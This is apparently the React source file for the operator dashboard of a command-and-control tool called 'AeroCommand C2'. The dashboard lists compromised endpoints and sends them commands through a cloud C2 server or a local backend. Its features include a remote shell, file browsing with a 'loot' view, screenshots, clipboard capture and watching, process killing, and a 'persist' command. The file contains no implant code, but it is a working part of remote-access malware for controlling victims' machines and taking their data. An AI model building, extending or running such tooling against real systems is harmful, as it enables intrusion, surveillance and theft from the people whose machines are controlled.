import React, { useState, useEffect, useCallback } from 'react';
import {
  Monitor, FolderOpen,
  Clipboard, Cpu, HardDrive,
  FileText, FileCode, Archive, File as FileGeneric,
  Image as ImageIcon
} from 'lucide-react';
import { invoke } from '@tauri-apps/api/core';

import Dashboard from './components/Dashboard';
import Endpoints from './components/Endpoints';
import TerminalView from './components/Terminal';
import FileExplorer from './components/FileExplorer';
import ProcessManager from './components/ProcessManager';
import ClipboardView from './components/ClipboardView';
import DatabaseView from './components/DatabaseView';
import SettingsView from './components/SettingsView';
import PreviewModal from './components/PreviewModal';
import Sidebar from './components/Sidebar';
import Header from './components/Header';
import { C2Provider, useC2 } from './context/C2Context';
import { useC2Polling } from './hooks/useC2Polling';
import { useFileExplorer } from './hooks/useFileExplorer';
import type { CommandLog, FileEntry, LootFile, ProcessEntry, PreviewData } from './types';

function AppInner() {
  const {
    c2Mode, c2ServerUrl, authHeader,
    setC2ConnectionStatus,
    clients, setClients, selectedClientId, setSelectedClientId,
    showToast,
  } = useC2();

  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'clipboard' | 'database' | 'settings'>('dashboard');
  const [logs, setLogs] = useState<CommandLog[]>([]);
  const [previewOpen, setPreviewOpen] = useState(false);
  const [previewData, setPreviewData] = useState<PreviewData | null>(null);
  const [isPreviewLoading, setIsPreviewLoading] = useState(false);
  const [previewZoom, setPreviewZoom] = useState(1);
  const [copiedPath, setCopiedPath] = useState(false);
  const [lootFiles, setLootFiles] = useState<LootFile[]>([]);
  const [selectedLoot, setSelectedLoot] = useState<LootFile | null>(null);
  const [lootContent, setLootContent] = useState<string | null>(null);
  const [processList, setProcessList] = useState<ProcessEntry[]>([]);
  const [isProcessesLoading, setIsProcessesLoading] = useState(false);
  const [processSearch, setProcessSearch] = useState('');
  const [termInput, setTermInput] = useState('');
  const [termLogs, setTermLogs] = useState<string[]>([
    'Welcome to AeroCommand C2 — Interactive Shell',
    'Use the command input below to interact with connected endpoints.',
    'Tip: Press Enter to execute. Commands are queued and results appear here.',
  ]);
  const [suggestions, setSuggestions] = useState<string[]>([]);
  const appendTermLog = useCallback((lines: string[]) => {
    setTermLogs(prev => {
      const next = [...prev, ...lines];
      return next.length > 200 ? next.slice(-200) : next;
    });
  }, []);

  const [fileSubTab, setFileSubTab] = useState<'explorer' | 'loot'>('explorer');

  const executeCommand = useCallback(async (cmd: string, silent: boolean = false) => {
    if (!cmd.trim()) return;
    const targetId = selectedClientId && clients.some(c => c.id === selectedClientId)
      ? selectedClientId
      : (clients[0]?.id || '');
    if (!silent) setTermLogs(prev => [...prev, `> ${cmd}`]);
    try {
      if (c2Mode === 'cloud' && c2ServerUrl) {
        const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
        const res = await fetch(`${cleanUrl}/api/send_command`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', ...authHeader },
          body: JSON.stringify({ client_id: targetId, command: cmd }),
        });
        if (res.ok) {
          if (!silent) setTermLogs(prev => [...prev, `[+] Command queued via Cloud C2 for ${targetId}`]);
        } else {
          if (!silent) setTermLogs(prev => [...prev, `[-] Cloud C2 error: ${res.statusText}`]);
        }
      } else {
        await invoke('send_command', { clientId: targetId, command: cmd });
        if (!silent) setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
      }
    } catch (err) {
      if (!silent) setTermLogs(prev => [...prev, `[-] Error sending command: ${err}`]);
    }
    setTermInput('');
    setSuggestions([]);
  }, [selectedClientId, clients, c2Mode, c2ServerUrl, authHeader]);

  const {
    currentPath,
    fileList,
    isFilesLoading,
    fileError,
    fileTruncated,
    fileTotalCount,
    navHistoryRef,
    browseFolder,
    goBack,
    listDrives,
    parseFileList,
  } = useFileExplorer(executeCommand);

  const renderBreadcrumbs = () => {
    if (!currentPath || currentPath === 'System Drives') return null;
    const parts = currentPath.split('/').filter(Boolean);
    return (
      <div className="flex items-center space-x-1 text-[10px] font-mono text-slate-400 mt-0.5">
        {parts.map((part, i) => (
          <React.Fragment key={i}>
            {i > 0 && <span className="text-slate-600">/</span>}
            <span className="hover:text-c2accent cursor-pointer transition-colors">{part}</span>
          </React.Fragment>
        ))}
      </div>
    );
  };

  const getFileMeta = (file: FileEntry) => {
    const ext = file.name.split('.').pop()?.toLowerCase() || '';
    const imageExts = ['png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp', 'ico'];
    const textExts = ['txt', 'log', 'json', 'xml', 'yaml', 'yml', 'md', 'ini', 'cfg', 'conf', 'bat', 'ps1', 'sh', 'py', 'js', 'ts', 'html', 'css', 'csv'];
    const codeExts = ['py', 'js', 'ts', 'jsx', 'tsx', 'c', 'cpp', 'h', 'hpp', 'cs', 'java', 'go', 'rs', 'rb', 'php', 'pl'];
    const archiveExts = ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'];
    let icon = <FileGeneric className="w-3.5 h-3.5 text-slate-400" />;
    let isPreviewable = false;
    if (file.is_dir) icon = <FolderOpen className="w-3.5 h-3.5 text-amber-400" />;
    else if (imageExts.includes(ext)) { icon = <ImageIcon className="w-3.5 h-3.5 text-emerald-400" />; isPreviewable = true; }
    else if (textExts.includes(ext)) { icon = <FileText className="w-3.5 h-3.5 text-blue-400" />; isPreviewable = true; }
    else if (codeExts.includes(ext)) { icon = <FileCode className="w-3.5 h-3.5 text-violet-400" />; isPreviewable = true; }
    else if (archiveExts.includes(ext)) icon = <Archive className="w-3.5 h-3.5 text-orange-400" />;
    return { icon, isPreviewable };
  };

  const requestPreview = async (filePath: string, _fileName: string) => {
    setPreviewOpen(true);
    setPreviewData(null);
    setIsPreviewLoading(true);
    try {
      const result = await invoke<PreviewData>('preview_file', { path: filePath });
      setPreviewData(result);
    } catch (e) {
      setPreviewData({ status: 'error', message: String(e) });
    } finally {
      setIsPreviewLoading(false);
    }
  };

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => { if (e.key === 'Escape') setPreviewOpen(false); };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  useC2Polling({
    activeTab,
    isFilesLoading,
    c2Mode,
    c2ServerUrl,
    authHeader,
    setClients,
    setLogs,
    setLootFiles,
    setProcessList,
    setIsProcessesLoading,
    setPreviewOpen,
    setPreviewData,
    parseFileList,
    appendTermLog,
    setC2ConnectionStatus,
    showToast,
  });

  const formatActivityLog = (log: CommandLog) => {
    const cmd = log.command || '';
    let category = 'commands';
    let badge = cmd.toUpperCase() || 'OUTPUT';
    let badgeClass = 'bg-blue-500/10 text-blue-400 border-blue-500/20';
    let title = cmd || 'Command Output';
    let detail = log.output.split('\n')[0] || '';
    let icon = <HardDrive className="w-3 h-3" />;
    let meta: string | undefined;
    if (cmd.startsWith('ls') || cmd.startsWith('cd') || cmd === 'download') {
      category = 'files'; badge = 'FILES'; badgeClass = 'bg-amber-500/10 text-amber-400 border-amber-500/20'; icon = <FolderOpen className="w-3 h-3" />;
    } else if (cmd === 'ps' || cmd === 'killproc') {
      category = 'processes'; badge = cmd === 'ps' ? 'PROCS' : 'KILL'; badgeClass = 'bg-violet-500/10 text-violet-400 border-violet-500/20'; icon = <Cpu className="w-3 h-3" />;
    } else if (cmd.startsWith('clip')) {
      category = 'clipboard'; badge = 'CLIP'; badgeClass = 'bg-rose-500/10 text-rose-400 border-rose-500/20'; icon = <Clipboard className="w-3 h-3" />;
    }
    if (log.output.includes('[JSON_FILES]')) {
      try { const data = JSON.parse(log.output.replace('[JSON_FILES]', '')); detail = `${data.files?.length || 0} items`; if (data.truncated) meta = `${data.count} total`; } catch {}
    } else if (log.output.includes('[JSON_PREVIEW]')) {
      try { const data = JSON.parse(log.output.replace('[JSON_PREVIEW]', '')); detail = data.name || log.output.split('\n')[0]; } catch {}
    } else if (log.output.includes('[JSON_PROCS]')) {
      try { const data = JSON.parse(log.output.replace('[JSON_PROCS]', '')); const count = Array.isArray(data) ? data.length : 0; detail = `${count} process${count !== 1 ? 'es' : ''}`; } catch {}
    } else if (log.output.startsWith('[JSON_SCREENSHOT]')) {
      category = 'files'; badge = 'SCREEN'; badgeClass = 'bg-cyan-500/10 text-cyan-400 border-cyan-500/20'; detail = 'Screenshot captured'; icon = <Monitor className="w-3 h-3" />;
    }
    if (detail.length > 55) detail = detail.slice(0, 55) + '...';
    return { category, badge, badgeClass, title, detail, icon, meta };
  };

  const fetchProcesses = (silent: boolean = true) => { setIsProcessesLoading(true); executeCommand('ps', silent); };
  const killProcess = (pidOrName: string) => { executeCommand(`killproc ${pidOrName}`, false); };
  const viewLoot = async (file: LootFile) => {
    setSelectedLoot(file);
    setLootContent(null);
    try { const content = await invoke<string>('get_loot_file', { path: file.path }); setLootContent(content); } catch { setLootContent(null); }
  };
  const handleInputChange = (val: string) => {
    setTermInput(val);
    if (val.trim()) {
      const cmds = ['sysinfo', 'screenshot', 'ps', 'clip', 'clipwatch', 'clipstop', 'persist', 'kill', 'killproc', 'ls', 'cd', 'download', 'upload', 'clear', 'help'];
      const filtered = cmds.filter(c => c.startsWith(val.toLowerCase()));
      setSuggestions(filtered);
    } else setSuggestions([]);
  };
  const onRefreshClients = () => {
    (async () => {
      const { c2Mode: mode, c2ServerUrl: url, authHeader: ah } = { c2Mode, c2ServerUrl, authHeader };
      if (mode === 'cloud' && url) {
        const cleanUrl = url.replace(/\/+$/, '');
        const res = await fetch(`${cleanUrl}/api/clients`, { headers: ah });
        if (res.ok) setClients(await res.json());
      } else setClients(await invoke<any>('get_clients'));
    })();
  };

  const { c2Mode: _m, c2ServerUrl: _u, c2OperatorToken: _t, c2ConnectionStatus: _s, setC2Mode, setC2ServerUrl, setC2OperatorToken, setC2ConnectionStatus: _scs } = useC2();

  return (
    <div className="flex h-screen w-screen bg-c2bg text-slate-100 overflow-hidden font-sans select-none antialiased">
      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />
      <div className="flex-1 flex flex-col overflow-hidden bg-c2bg">
        <Header activeTab={activeTab} setActiveTab={setActiveTab} termInput={termInput} handleInputChange={handleInputChange} executeCommand={executeCommand} />
        <div className="flex-1 overflow-y-auto p-6">
          {activeTab === 'dashboard' && (
            <Dashboard clients={clients} logs={logs} selectedClientId={selectedClientId} setSelectedClientId={setSelectedClientId} setActiveTab={setActiveTab} formatActivityLog={formatActivityLog} executeCommand={executeCommand} onRefreshClients={onRefreshClients} />
          )}
          {activeTab === 'endpoints' && (
            <Endpoints clients={clients} selectedClientId={selectedClientId} setSelectedClientId={setSelectedClientId} setActiveTab={setActiveTab} onRefreshClients={onRefreshClients} />
          )}
          {activeTab === 'terminal' && (
            <TerminalView clients={clients} selectedClientId={selectedClientId} termLogs={termLogs} termInput={termInput} setTermInput={setTermInput} suggestions={suggestions} setSuggestions={setSuggestions} executeCommand={executeCommand} handleInputChange={handleInputChange} />
          )}
          {activeTab === 'files' && (
            <FileExplorer fileSubTab={fileSubTab} setFileSubTab={setFileSubTab} currentPath={currentPath} fileList={fileList} isFilesLoading={isFilesLoading} fileError={fileError} fileTruncated={fileTruncated} fileTotalCount={fileTotalCount} navHistoryRef={navHistoryRef} browseFolder={browseFolder} goBack={goBack} listDrives={listDrives} renderBreadcrumbs={renderBreadcrumbs} getFileMeta={getFileMeta} requestPreview={requestPreview} executeCommand={executeCommand} lootFiles={lootFiles} selectedLoot={selectedLoot} lootContent={lootContent} viewLoot={viewLoot} />
          )}
          {activeTab === 'processes' && (
            <ProcessManager processList={processList} isProcessesLoading={isProcessesLoading} processSearch={processSearch} setProcessSearch={setProcessSearch} fetchProcesses={fetchProcesses} killProcess={killProcess} />
          )}
          {activeTab === 'clipboard' && (<ClipboardView logs={logs} clients={clients} executeCommand={executeCommand} />)}
          {activeTab === 'database' && <DatabaseView logs={logs} />}
          {activeTab === 'settings' && (
            <SettingsView c2Mode={_m} setC2Mode={setC2Mode} c2ServerUrl={_u} setC2ServerUrl={setC2ServerUrl} c2OperatorToken={_t} setC2OperatorToken={setC2OperatorToken} c2ConnectionStatus={_s} setC2ConnectionStatus={_scs} showToast={showToast} />
          )}
        </div>
      </div>
      <PreviewModal previewOpen={previewOpen} previewData={previewData} isPreviewLoading={isPreviewLoading} previewZoom={previewZoom} setPreviewZoom={setPreviewZoom} copiedPath={copiedPath} setCopiedPath={setCopiedPath} setPreviewOpen={setPreviewOpen} />
    </div>
  );
}

export default function App() {
  return (
    <C2Provider>
      <AppInner />
    </C2Provider>
  );
}
